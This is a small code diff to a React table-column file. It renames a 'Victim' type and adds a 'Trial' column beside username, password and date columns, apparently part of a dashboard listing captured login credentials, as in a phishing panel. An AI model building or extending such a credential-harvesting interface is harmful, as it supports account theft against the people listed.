@@ -1,10 +1,10 @@
 "use client";
 
 import { ColumnDef } from "@tanstack/react-table";
-import { type victim } from "@/db/schema";
+import { type Victim } from "@/db/schema";
 import DeleteUser from "./deleteUser";
 
-export const columns: ColumnDef<victim>[] = [
+export const columns: ColumnDef<Victim>[] = [
   {
     accessorKey: "username",
     header: "Email/Username",
@@ -12,6 +12,10 @@ export const columns: ColumnDef<victim>[] = [
   {
     accessorKey: "password",
     header: "Password",
+  },
+  {
+    accessorKey: "trial",
+    header: "Trial",
   },
   {
     header: "Date",
